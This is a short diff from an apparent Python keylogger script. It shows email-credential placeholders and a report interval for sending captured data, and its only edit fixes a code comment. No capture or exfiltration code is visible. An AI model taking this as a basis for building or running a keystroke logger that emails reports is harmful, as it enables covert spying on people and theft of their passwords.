@@ -11,7 +11,7 @@ EMAIL_ADDRESS = "YOUR EMAIL"
 EMAIL_PASSWORD = "YOUR PASSWORD" # Generate App password by turning on 2TA!
 
 #report_time
-SEND_REPORT = 60 # It have to interger!! Unit: Second(s)
+SEND_REPORT = 60 # Interger only!! Unit: Second(s)
 
 
 class Keylogger:
